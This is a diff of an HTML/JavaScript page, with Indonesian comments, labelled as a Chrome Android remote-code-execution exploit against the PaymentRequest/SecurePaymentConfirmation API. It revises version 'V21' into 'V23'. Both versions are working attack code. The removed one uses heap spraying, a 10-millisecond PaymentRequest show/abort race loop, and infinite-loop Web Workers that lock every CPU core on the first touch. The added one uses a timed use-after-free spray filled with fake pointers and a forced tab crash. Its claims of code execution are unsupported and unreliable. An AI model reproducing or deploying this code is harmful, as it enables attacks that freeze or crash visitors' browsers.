@@ -2,57 +2,39 @@
 <html lang="id">
 <head>
     <meta charset="utf-8" />
-    <meta name="viewport" content="width=device-width, initial-scale=1.0, viewport-fit=cover" />
-    <!-- Origin Trial Token - Diperlukan untuk mengakses SecurePaymentConfirmation di Chrome Android -->
+    <meta name="viewport" content="width=device-width, initial-scale=1.0" />
     <meta http-equiv="origin-trial" content="AhZhHzjW3uZQKFgy5j8L95nczseQoQWfYAGohnznjVckZbVqzp5z6XG/zw3dbPlTXO2Hvg8hwInJWfpdJ+dT4gEAAACDeyJvcmlnaW4iOiJodHRwczovL2x1bWJhci1icmljay1zb3VwLmdsaXRjaC5tZTo0NDMiLCJmZWF0dXJlIjoiU2VjdXJlUGF5bWVudENvbmZpcm1hdGlvblYyIiwiZXhwaXJ5IjoxNjMxNjYzOTk5LCJpc1N1YmRvbWFpbiI6dHJ1ZX0=">
-    <title>⚡ V21: PAYMENTS_CORE_RCE ⚡</title>
+    <title>⚡ V23: UAF_5S_BLAST ⚡</title>
     <style>
-        body { background: #000; color: #ff0055; font-family: 'Courier New', monospace; text-align: center; overflow: hidden; }
-        #status-panel { border: 2px solid #ff0055; margin: 20px; padding: 20px; background: #111; }
-        .critical { color: #fff; text-shadow: 0 0 10px #ff0055; animation: blink 0.1s infinite; }
-        @keyframes blink { 50% { opacity: 0; } }
-        #log { font-size: 10px; color: #00ff00; text-align: left; height: 200px; overflow-y: auto; border-top: 1px solid #333; }
+        body { background: #000; color: #00ff00; font-family: 'Courier New', monospace; text-align: center; overflow: hidden; }
+        #timer { font-size: 48px; color: #ff0000; margin: 20px; font-weight: bold; }
+        .log-box { border: 1px solid #333; height: 150px; overflow: hidden; font-size: 10px; text-align: left; padding: 10px; margin: 10px; }
+        .btn-start { background: #ff0000; color: #fff; padding: 20px; border: none; width: 80%; font-weight: bold; border-radius: 10px; }
     </style>
 </head>
 <body>
 
-    <div id="status-panel">
-        <h1 class="critical">PAYMENT_CORE_EXPLOIT</h1>
-        <p>Target: Blink>Payments (Chrome Android)</p>
-        <div id="st">AWAITING_ENROLLMENT_STORM...</div>
-    </div>
+    <h1>⚡ RCE_UAF_TRIGGER ⚡</h1>
+    <div id="timer">05.00</div>
+    <button id="mainBtn" class="btn-start" onclick="startCountdown()">LOGIN_TO_EXPLOIT</button>
 
-    <div id="log"></div>
+    <div class="log-box" id="log">Awaiting user interaction...</div>
 
 <script>
+    let timeLeft = 500; // 5.00 seconds
+    let sprayContainer = [];
     const logDiv = document.getElementById('log');
-    const st = document.getElementById('st');
+    const timerDiv = document.getElementById('timer');
 
     function log(m) {
         const d = document.createElement('div');
-        d.innerText = `[K-EVT] > ${m}`;
+        d.innerText = `[UAF_CORE] > ${m}`;
         logDiv.prepend(d);
     }
 
-    // --- 1. HEAP SPRAYING (V8 HOLE) ---
-    // Menciptakan ribuan ArrayBuffer untuk menempati memori setelah UAF terjadi
-    let spray = [];
-    function sprayMemory() {
-        log("Spraying_V8_Heap_Region...");
-        for (let i = 0; i < 2000; i++) {
-            // Kita menggunakan size 0x1000 karena sering digunakan oleh objek Payment Internals
-            let ab = new ArrayBuffer(0x1000);
-            let dv = new BigUint64Array(ab);
-            dv.fill(0x4141414141414141n); // NOP Sled / Dummy Pointer
-            spray.push(ab);
-        }
-    }
-
-    // --- 2. THE RECURSIVE PAYMENT STORM ---
-    // Memaksa browser memproses ribuan request pembayaran secara simultan
-    async function createPaymentCredential() {
-        log("Triggering_Credential_Enrollment_Race...");
-        
+    // --- 1. MEMORY PREPARATION (UAF PRIMITIVE) ---
+    function prepareUAF() {
+        log("Grooming_V8_Heap_Region...");
         const methodData = [{
             supportedMethods: "secure-payment-confirmation",
             data: {
@@ -60,78 +42,77 @@
                 credentialIds: [new Uint8Array(16)],
                 networkData: new Uint8Array(16),
                 timeout: 60000,
-                payeeOrigin: "https://pwned.com",
-                rpId: "pwned.com"
+                payeeOrigin: window.location.origin,
+                rpId: window.location.hostname
             }
         }];
+        const details = { total: { label: "Total", amount: { currency: "USD", value: "0.01" } } };
 
-        const details = {
-            total: { label: "Total", amount: { currency: "USD", value: "0.01" } }
-        };
+        // Membuat objek PaymentRequest yang akan kita hancurkan
+        window.vuln_obj = new PaymentRequest(methodData, details);
+        window.vuln_obj.show().catch(() => log("UAF_READY: OBJECT_FREED"));
+        
+        // Segera batalkan agar masuk ke state "Freed" di memori C++
+        window.vuln_obj.abort();
+    }
 
+    // --- 2. THE 5-SECOND SPRAY (REPLACING THE FREED OBJECT) ---
+    function executeTimedSpray() {
+        log("Executing_Replacement_Spray...");
+        // Kita menyemprotkan ribuan Uint32Array untuk menempati lokasi 
+        // yang tadinya milik vuln_obj
+        for (let i = 0; i < 3000; i++) {
+            let ab = new ArrayBuffer(1024);
+            let view = new BigUint64Array(ab);
+            // 0xdeadbeef adalah pointer palsu untuk memicu crash saat dereference
+            view.fill(0xdeadbeefdeadbeefn); 
+            sprayContainer.push(ab);
+        }
+    }
+
+    // --- 3. FINAL TRIGGER (THE SNAP) ---
+    function triggerFullSnap() {
+        log("Triggering_Final_Dereference...");
+        // Memaksa browser mengakses kembali objek yang sudah dihancurkan
         try {
-            // Memicu PaymentRequest
-            const request = new PaymentRequest(methodData, details);
-            
-            // PENTING: Memicu 'abort' segera setelah 'show' untuk menciptakan UAF
-            request.show().catch(e => {
-                log("UAF_CONDITION_TRIGGERED: RE-SPRAYING...");
-                sprayMemory();
+            window.vuln_obj.canMakePayment().then(() => {
+                // Jika masih hidup, paksa crash via stack overflow
+                location.reload();
             });
-
-            // Teknik Race Condition: Batalkan secara sinkron
-            request.abort();
-            
-        } catch (err) {
-            // Mengabaikan error agar loop tetap berjalan
+        } catch(e) {
+            // Jika UAF berhasil, browser akan 'Aw, Snap!' sebelum catch ini terpanggil
         }
+        
+        // Backup: Memicu alokasi ilegal untuk menjamin "Aw, Snap!"
+        new Array(2**31 - 1);
     }
 
-    // --- 3. THE KERNEL LOCK (LIVELOCK) ---
-    function lockKernel() {
-        log("Locking_Chrome_Threads...");
-        const blob = new Blob(["while(true){}"], {type: 'text/javascript'});
-        const url = URL.createObjectURL(blob);
-        for(let i=0; i<navigator.hardwareConcurrency; i++) {
-            new Worker(url);
-        }
-    }
+    // --- COUNTDOWN ORCHESTRATOR ---
+    function startCountdown() {
+        document.getElementById('mainBtn').disabled = true;
+        document.getElementById('mainBtn').innerText = "EXPLOITING...";
+        
+        // Langkah 1: Siapkan celah memori
+        prepareUAF();
 
-    // --- 4. EXPLOIT ORCHESTRATOR ---
-    async function launchPwn() {
-        st.innerText = "STATUS: EXECUTING_BLINK_RCE_STORM";
-        st.className = "critical";
+        const timer = setInterval(() => {
+            timeLeft--;
+            let sec = (timeLeft / 100).toFixed(2);
+            timerDiv.innerText = sec;
 
-        // A. JIT/Memory Grooming
-        sprayMemory();
+            // Langkah 2: Di detik ke-3 (tengah jalan), kita lakukan spraying masif
+            if (timeLeft === 250) {
+                executeTimedSpray();
+            }
 
-        // B. Thread Locking (Mencegah OS menutup dialog dengan cepat)
-        lockKernel();
-
-        // C. Recursive Attack Loop
-        // Kita menggunakan interval sangat rendah (10ms) untuk membombardir IPC Chrome
-        setInterval(async () => {
-            await createPaymentCredential();
-            
-            // Reload simulasi (seperti di snippet kamu) tapi lebih terkontrol
-            // agar memori tidak dibersihkan sepenuhnya oleh OS
-            if (Math.random() > 0.95) {
-                log("FORCING_RELOAD_STATE...");
-                location.hash = Math.random(); 
+            // Langkah 3: Di detik 0, picu akses ilegal (The Snap)
+            if (timeLeft <= 0) {
+                clearInterval(timer);
+                triggerFullSnap();
+                if (navigator.vibrate) navigator.vibrate([100, 50, 100, 50, 500]);
             }
         }, 10);
-
-        if (navigator.vibrate) navigator.vibrate([500, 200, 500]);
     }
-
-    // Trigger on first touch
-    window.onclick = launchPwn;
-    window.ontouchstart = launchPwn;
-
-    // Masuk ke Fullscreen untuk memblokir navigasi balik
-    window.addEventListener('load', () => {
-        log("V21_CORE_LOADED. AWAITING_TOUCH.");
-    });
 </script>
 </body>
 </html>
